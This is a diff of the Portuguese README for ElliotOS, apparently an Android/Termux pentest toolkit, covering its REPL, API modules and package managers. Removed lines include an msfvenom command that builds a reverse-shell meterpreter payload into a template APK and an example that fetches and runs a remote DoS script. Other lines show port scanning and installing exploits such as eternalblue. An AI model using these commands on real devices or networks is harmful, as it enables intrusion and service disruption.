@@ -1,13 +1,14 @@
 <div align="center">
 
 ```
-  _____ _ _ _       _    ___  ____
- | ____| | (_) ___ | |_ / _ \/ ___|
- | |_  | | | |/ _ \| __| | | \___ \
- | |___| | | | (_) | |_| |_| |___) |
- |_____|_|_|_|\___/ \__|\___/____/
+  ███████╗██╗     ██╗     ██╗ ██████╗ ████████╗
+  ██╔════╝██║     ██║     ██║██╔═══██╗╚══██╔══╝
+  █████╗  ██║     ██║     ██║██║   ██║   ██║
+  ██╔══╝  ██║     ██║     ██║██║   ██║   ██║
+  ███████╗███████╗███████╗██║╚██████╔╝   ██║
+  ╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝    ╚═╝
 
- Pentest System  //  Android / Termux  //  No Root
+  Pentest System  //  Android / Termux  //  No Root
 ```
 
 **O primeiro sistema de pentest nativo para Android — sem root, no bolso.**
@@ -30,6 +31,7 @@
 - [Ferramentas incluídas](#ferramentas-incluídas)
 - [CYN — IA nativa](#cyn--ia-nativa)
 - [ms — Referência de flags](#ms--referência-de-flags)
+- [REPL ms — Recursos avançados](#repl-ms--recursos-avançados)
 - [Comandos especiais do REPL](#comandos-especiais-do-repl)
 - [Módulos da API](#módulos-da-api-globais-no-repl--nunca-use-require)
   - [net.\*](#net--rede)
@@ -51,13 +53,13 @@
   - [tui.\*](#tui--framework-de-ui-de-terminal-interativo)
   - [ell.\*](#ell--encoderdecoder-de-scripts)
   - [agent.\*](#agent--agente-autônomo)
-  - [ivar.\* ⚡ ATUALIZADO](#ivar--variáveis-indexadas-v20--atualizado)
+  - [ivar.\*](#ivar--variáveis-indexadas-v20)
   - [ms.\*](#ms--utilitários-do-sistema)
   - [string.\*](#string--extensões-de-string)
   - [util.\*](#util--stdlib-funcional)
   - [json.\*](#json--json-nativo)
   - [back(), lg(), ic()](#back--saída-temporária-para-bash)
-- [net.import — atualizado](#netimport--atualizado)
+- [net.import](#netimport)
 - [xtun — Tunnel Toolkit](#xtun--tunnel-toolkit)
 - [appforge — HTML/CSS/JS para APK](#appforge--htmlcssjs-para-apk)
 - [ms -ba — Arch Linux ARM + BlackArch](#ms--ba--arch-linux-arm--blackarch)
@@ -81,7 +83,7 @@ Kali Linux, Black Arch, Parrot OS — todos exigem PC. O ElliotOS roda no bolso,
 
 Tudo é compilado e instalado via um único script (`luascript.sh`), que constrói do zero:
 - Um interpretador Lua 5.4.8 customizado com extensões de rede (`lua-net`)
-- Uma biblioteca C com módulos de segurança embutidos (`libnet.so`)
+- Uma biblioteca C com módulos de segurança embutidos (`libnet.c`)
 - Uma IA nativa chamada **CYN**, integrada diretamente ao binário
 - Ferramentas próprias: `ms`, `lpm`, `xpm`, `cxx`, `ee`, `xtun`
 
@@ -131,8 +133,6 @@ Antes de instalar qualquer coisa, o script verifica automaticamente:
 ---
 
 ### Mínimo — só o ElliotOS
-
-Sistema, REPL `ms`, ferramentas de rede e pentest. Sem editor, sem GUI.
 
 ```bash
 pkg update -y && pkg install -y git wget curl clang
@@ -402,6 +402,65 @@ ms --doc json                 # json.*
 
 ---
 
+## REPL ms — Recursos avançados
+
+O REPL do `ms` é construído sobre GNU Readline com diversas melhorias nativas em C:
+
+### Syntax highlight em tempo real
+
+As palavras são coloridas **instantaneamente** enquanto você digita, sem delay. O colorizer reconhece:
+
+| Token | Cor |
+|-------|-----|
+| Keywords Lua (`if`, `for`, `function`, `local`...) | Azul bold |
+| `try`, `tryf`, `tryfp` (extensões ElliotOS) | Ciano bold |
+| Strings (`"..."`, `'...'`) | Verde |
+| Números | Amarelo |
+| Comentários (`--`) | Cinza |
+| Módulos (`void.`, `net.`, `mod.`) | Azul claro |
+| Operadores (`+`, `-`, `==`, `..`) | Amarelo |
+| Chamadas de função (`nome(`) | Roxo |
+
+### Auto-pair
+
+Abre automaticamente o par de fechamento e posiciona o cursor no meio:
+
+| Digita | Resultado no buffer |
+|--------|---------------------|
+| `(` | `(\|)` |
+| `[` | `[\|]` |
+| `{` | `{\|}` |
+| `"` | `"\|"` |
+| `'` | `'\|'` |
+
+Se o próximo caractere já é o par de fechamento, o cursor apenas avança (sem duplicar).
+
+### Tab completion inteligente
+
+- **Módulos:** digitar `void` + Tab insere automaticamente o `.` e exibe os métodos disponíveis (`void.tcp(`, `void.udp(`, `void.syn(`)
+- **Métodos:** `void.` + Tab lista os métodos do módulo
+- **`require("@user/`** + Tab lista arquivos do `$HOME/` com **case-insensitive** — funciona mesmo se o diretório começa com letra maiúscula (ex: `Downloads/`)
+- **`require("@std/`** + Tab lista módulos do sistema
+- **Globals Lua:** variáveis e funções definidas na sessão atual
+- **Keywords:** palavras-chave da linguagem
+
+### Histórico persistente
+
+O histórico de comandos é salvo em `~/.elliot_history` **imediatamente** após cada linha executada — via `write()` com `O_APPEND` direto no kernel. Isso garante persistência mesmo com `Ctrl+C`, `SIGKILL` ou crash. As últimas **2000 entradas** são carregadas automaticamente ao iniciar o REPL.
+
+### Atalhos de teclado
+
+| Atalho | Ação |
+|--------|------|
+| `↑` / `↓` | Navega no histórico |
+| `Shift+↑` / `Shift+↓` | Busca no histórico pelo prefixo atual |
+| `Ctrl+R` | Busca reversa no histórico |
+| `Ctrl+L` | Limpa a tela |
+| `Ctrl+C` | Cancela linha / interrompe execução |
+| `Tab` | Completion inteligente |
+
+---
+
 ## Comandos especiais do REPL
 
 Os comandos abaixo **não são funções Lua** — não precisam de `()`. São interceptados pelo preprocessador antes do parser Lua os ver. Funcionam também como função (`clear()`, `help()`) para compatibilidade.
@@ -418,9 +477,35 @@ Os comandos abaixo **não são funções Lua** — não precisam de `()`. São i
 
 ---
 
-## Módulos da API (globais no REPL — nunca use `require()`)
+## Módulos da API
 
-Todos os módulos abaixo são objetos globais disponíveis automaticamente no REPL e em qualquer script executado com `ms`. Usar `require()` neles causa erro fatal.
+Os módulos do ElliotOS são acessados via `require("@std")` — não são globais automaticamente em scripts `.lua` rodados com `lua-net` diretamente. No REPL (`ms`) e nos scripts executados com `ms -f`, o `require("@std")` já é chamado automaticamente.
+
+### Como carregar os módulos
+
+```lua
+-- Carrega todos os módulos de uma vez (recomendado)
+require("@std")
+-- Após isso: net, fs, sys, ai, crypto, db, mod, etc. ficam disponíveis como globais
+
+-- Carrega um módulo específico (retorna o módulo)
+local net = require("@std/net")
+local fs  = require("@std/fs")
+local mod = require("@std/mod")
+
+-- Carrega módulo do usuário (arquivo em $HOME/)
+local meu = require("@user/Downloads/main")
+-- → carrega $HOME/Downloads/main.lua
+
+-- Módulos disponíveis via @std
+-- net, fs, sys, sh, ai, crypto, db, mod, ms, ui, tui, web,
+-- pent, exploit, lmod, agent, adb, util, json, re, cc, ivar,
+-- dow, log, csv, try, str
+```
+
+> **No REPL `ms`:** `require("@std")` é chamado automaticamente — todos os módulos ficam disponíveis como globais sem nenhuma chamada adicional.  
+> **Em scripts `ms -f script.lua`:** idem — o prelude já executa `require("@std")` antes do seu script.  
+> **Em scripts `lua-net script.lua` direto:** adicione `require("@std")` no topo do arquivo.
 
 ---
 
@@ -522,9 +607,6 @@ if r and r.open then print("aberta:", r.ms, "ms") end
 -- Port scan completo
 local portas = net.scan('192.168.1.1', 1, 65535)
 for _, p in ipairs(portas) do print('aberta:', p) end
-
--- Banner grab SSH
-print(net.socket("ipv4","stream","192.168.1.1",22))
 
 -- HTTP manual via socket OO
 local s = net.socketex("ipv4","stream","example.com",80)
@@ -986,9 +1068,9 @@ agent.chat('como funciona heap spray?')
 
 ---
 
-### `ivar.*` — Variáveis indexadas v2.0 ⚡ ATUALIZADO
+### `ivar.*` — Variáveis indexadas v2.0
 
-O `ivar` é o sistema de **variáveis indexadas** do ElliotOS. Toda variável declarada recebe automaticamente um índice `!N`, permitindo referenciá-la pelo número em vez do nome completo — excelente para nomes longos em projetos sérios, UIs e jogos. **Ativado por padrão desde a instalação.**
+O `ivar` é o sistema de **variáveis indexadas** do ElliotOS. Toda variável declarada recebe automaticamente um índice `!N`, permitindo referenciá-la pelo número em vez do nome completo. **Ativado por padrão desde a instalação.**
 
 ```lua
 ivar.enable()                                    -- ativa (padrão)
@@ -1005,8 +1087,6 @@ ivar.help()
 
 #### `!N` — Índices numéricos (escopo global)
 
-Cada variável declarada no escopo global recebe um índice sequencial. Use `!N` em qualquer expressão para expandir para o nome completo:
-
 ```lua
 nome_longo_aqui = "Mike"   -- !1 → nome_longo_aqui
 player_score    = 9800     -- !2 → player_score
@@ -1014,87 +1094,32 @@ server_response = {}       -- !3 → server_response
 
 print(!1, !2)              -- equivale a: print(nome_longo_aqui, player_score)
 !3["status"] = 200         -- equivale a: server_response["status"] = 200
-
-ivar.list()
--- !1 → nome_longo_aqui   = "Mike"
--- !2 → player_score      = 9800
--- !3 → server_response   = table
 ```
 
-#### `!!N` — Acesso a variáveis fora do escopo atual ⚡ NOVO
-
-Dentro de funções, o índice `!N` reinicia do 1. Para acessar variáveis do escopo **externo** (global ou de um escopo pai), use `!!N` com dois pontos de exclamação:
+#### `!!N` — Acesso a variáveis do escopo externo
 
 ```lua
 dano_global    = 50        -- !1 no escopo global
 multiplicador  = 3         -- !2 no escopo global
 
 function calcular()
-    bonus = 10             -- !1 neste escopo (local à função)
+    bonus = 10             -- !1 neste escopo
     local total = !!1 * !!2 + !1
-    -- !!1 → dano_global (escopo externo)
-    -- !!2 → multiplicador (escopo externo)
-    -- !1  → bonus (escopo atual)
+    -- !!1 → dano_global / !!2 → multiplicador / !1 → bonus
     return total           -- 50 * 3 + 10 = 160
-end
-
-print(calcular())  -- 160
-```
-
-> **Regra:** `!N` sempre resolve no escopo atual (função corrente). `!!N` sempre sobe um nível e resolve no escopo pai (global ou escopo envolvente).
-
-```lua
--- Exemplo prático: função com variáveis internas e externas
-config_timeout = 30        -- !!1 de dentro da função
-config_retries = 5         -- !!2 de dentro da função
-
-function connect(host)
-    socket = net.tcp(host, 80)   -- !1 dentro de connect
-    socket:settimeout(!!1)       -- usa config_timeout (escopo externo)
-    for i = 1, !!2 do            -- usa config_retries (escopo externo)
-        if !1:wait() then break end
-    end
-    return !1                    -- retorna socket
 end
 ```
 
 #### Aliases nomeados
 
-A linha `!alias = varname` é interceptada pelo pré-processador e não chega ao parser Lua:
-
 ```lua
 player_health_percentage = 100
-!hp = player_health_percentage   -- registra alias (linha some do código gerado)
+!hp = player_health_percentage   -- registra alias
 print(!hp)                        -- expande para: print(player_health_percentage)
-!hp = !hp - 10                   -- player_health_percentage = player_health_percentage - 10
+!hp = !hp - 10
 ```
 
-#### Escopo por função — `!N` reinicia dentro de cada função
-
-```lua
-function ataque()
-    dano_base     = 10    -- !1 neste escopo
-    multiplicador = 2     -- !2 neste escopo
-    return !1 * !2        -- return dano_base * multiplicador → 20
-end
-
-function defesa()
-    armadura = 5          -- !1 neste escopo (diferente do !1 de ataque)
-    reducao  = 0.3        -- !2 neste escopo
-    return !1 * !2        -- return armadura * reducao → 1.5
-end
-```
-
-#### Modo debug
-
-```lua
-ivar.debug(true)    -- ativa
-x = 10              -- stderr: [ivar:debug] !1 → x
-y = 20              -- stderr: [ivar:debug] !2 → y
-ivar.debug(false)   -- desativa
-```
-
-Persistência: estado salvo em `~/.elliot_ivar.cfg`. Resetado automaticamente a cada reinstalação para garantir que o ivar inicie ativo.
+Persistência: estado salvo em `~/.elliot_ivar.cfg`.
 
 ---
 
@@ -1192,15 +1217,6 @@ util.func(mod)                   -- lista funções de qualquer módulo ou tabel
 util.help()
 ```
 
-**`util.func` — inspetor de módulos:**
-```lua
-util.func(math)        -- lista todas as funções do math.*
-util.func('socket')    -- carrega e inspeciona módulo luarocks
-util.func(net)         -- inspeciona módulos do ElliotOS
-```
-
-Detecta nomes dos parâmetros via `debug.getinfo` para funções Lua puras. Funções C são marcadas com `[C]`.
-
 ---
 
 ### `json.*` — JSON nativo
@@ -1208,15 +1224,6 @@ Detecta nomes dos parâmetros via `debug.getinfo` para funções Lua puras. Fun�
 ```lua
 json.encode(v)   -- Lua → JSON string (nil→"null", bool, number, string, table)
 json.decode(s)   -- JSON string → Lua value
-```
-
-**Exemplo:**
-```lua
-local t = {nome="Mike", porta=443, ativo=true}
-local s = json.encode(t)
-print(s)             -- {"ativo":true,"nome":"Mike","porta":443}
-local r = json.decode(s)
-print(r.nome)        -- Mike
 ```
 
 ---
@@ -1238,9 +1245,9 @@ ic()   -- exibe logo PNG via timg (requer timg instalado)
 
 ---
 
-## `net.import` — atualizado
+## `net.import`
 
-Baixa e executa scripts remotos diretamente no ElliotOS. Aceita um segundo argumento `mode` para escolher como o script será executado:
+Baixa e executa scripts remotos diretamente no ElliotOS:
 
 ```lua
 net.import(url)          -- mode 0 (padrão): executa com ms -f (linguagem ElliotOS)
@@ -1248,28 +1255,13 @@ net.import(url, 0)       -- idem
 net.import(url, 1)       -- executa como Lua puro via luar (sem extensões ElliotOS)
 ```
 
-**Retorno:**
-- Sucesso: `true`
-- Falha: `false, "mensagem de erro detalhada"`
-
 **Verificando erros:**
 ```lua
 local ok, err = net.import("https://raw.githubusercontent.com/.../script.ms")
-if not ok then
-    print("Erro:", err)
-end
+if not ok then print("Erro:", err) end
 ```
 
-**Exemplos:**
-```lua
--- Script ElliotOS (.ms) — usa ms -f
-net.import("https://raw.githubusercontent.com/mikeelliot218/Scripts-ElliotOS/main/DoS-Simple.lua")
-
--- Módulo Lua puro — usa luar (sem acesso a net.*, mod.*, etc.)
-net.import("https://exemplo.com/modulo.lua", 1)
-```
-
-> O script é baixado para um arquivo temporário em `$TMPDIR` (Termux define automaticamente) e executado pelo binário apropriado. O arquivo temporário é removido ao terminar.
+> O script é baixado para um arquivo temporário em `$TMPDIR` e removido ao terminar.
 
 ---
 
@@ -1284,8 +1276,6 @@ xtun -U [bind:]lport:rhost:rport   # Forward UDP (datagrama, sem conexão)
 xtun -l porta                       # Modo listener cru (proxy TCP simples)
 ```
 
-Útil para expor portas locais (servidores, painéis web) para fora do device sem root.
-
 ---
 
 ## appforge — HTML/CSS/JS para APK
@@ -1297,20 +1287,14 @@ xpm install appforge
 ```
 
 ```bash
-# Estrutura mínima do projeto
-./meuapp/
-├── index.html   ← ponto de entrada obrigatório
-├── style.css
-└── script.js
-
-appforge check ./meuapp/                    # analisa antes de compilar
-appforge build ./meuapp/                    # APK básico
+appforge check ./meuapp/
+appforge build ./meuapp/
 appforge build ./meuapp/ --name "Meu App" --pkgname com.meuapp --perm camera,mic --fullscreen
-appforge build --url https://exemplo.com --name "Meu Site"   # site remoto → APK
-appforge template basic                     # gera template HTML + CSS + JS básico
-appforge template game                      # gera template jogo Snake funcional
-appforge template pwa                       # gera template PWA com suporte offline
-appforge --man                              # manual completo
+appforge build --url https://exemplo.com --name "Meu Site"
+appforge template basic
+appforge template game
+appforge template pwa
+appforge --man
 ```
 
 | Opção | Descrição |
@@ -1343,10 +1327,7 @@ pacman -Sg blackarch-scanner
 pacman -Sg blackarch-exploitation
 ```
 
-| Modo | CLI | GUI (XFCE4/VNC) |
-|------|-----|-----------------|
-| NetHunter | ✓ | ✓ |
-| BlackArch | ✓ | ✗ (não suportado em proot) |
+> BlackArch funciona apenas em modo CLI. Interface gráfica não é suportada em proot.
 
 ---
 
@@ -1404,24 +1385,10 @@ xpm upgrade                # ferramentas pinadas são ignoradas com aviso
 
 ---
 
-## msfvenom — Payload em APK com template
-
-```bash
-xpm install apkfull apkeditor metasploit
-xpm doctor
-
-msfvenom -p android/meterpreter/reverse_tcp \
-  LHOST=192.168.1.10 LPORT=4444 \
-  -x /caminho/template.apk \
-  -o payload.apk
-```
-
----
-
 ## LPM — Gerenciador de Pacotes Lua
 
 ```bash
-lpm install luasocket                      # instala módulo (fallback automático: lux/GitHub)
+lpm install luasocket                      # instala módulo
 lpm install --from lux luasocket           # forçar fonte
 lpm install --from luarocks luasocket
 lpm remove luasocket
@@ -1435,7 +1402,7 @@ lpm --script -i 3                         # baixa item 3 do último resultado
 lpm install --from exploit eternalblue
 ```
 
-**Fontes:** `exploit-db` (padrão), `packetstorm`, `github`
+**Fontes:** `exploit-db` (padrão), `packetstorm`, `github`  
 **Scripts baixados em:** `~/.elliot/scripts/`
 
 ---
@@ -1513,7 +1480,7 @@ rungui -l love jogo/
 
 ```
 ElliotOS/
-├── luascript.sh              # Script único de instalação — xpm v1.5.0
+├── luascript.sh              # Script único de instalação
 │   ├── libnet.c              # Biblioteca C com todos os módulos
 │   ├── Lua 5.4.8 source      # Interpretador customizado (baixado de lua.org)
 │   ├── xpm                   # Gerenciador de pentest (Bash)
@@ -1537,9 +1504,10 @@ ElliotOS/
 | `$HOME/.elliotai` | Configuração e cache da CYN |
 | `$HOME/.elliot` | Dados do usuário, scripts baixados via lpm |
 | `$HOME/.xpm/pins` | Versões pinadas pelo `xpm pin` |
-| `$HOME/.xpm/installed` | Metadados das ferramentas instaladas (versão, data, origin) |
+| `$HOME/.xpm/installed` | Metadados das ferramentas instaladas |
 | `$HOME/.elliot_logs` | Log de vulnerabilidades encontradas |
-| `$HOME/.elliot_ivar.cfg` | Estado persistente do ivar (ativado/desativado) |
+| `$HOME/.elliot_ivar.cfg` | Estado persistente do ivar |
+| `$HOME/.elliot_history` | Histórico persistente do REPL (2000 entradas) |
 | `$PREFIX/share/lua-scripts` | Scripts de exemplo do ElliotOS |
 | `$PREFIX/share/c-scripts` | Scripts C prontos |
 | `$PREFIX/share/lua-modules` | Módulos Lua do sistema |
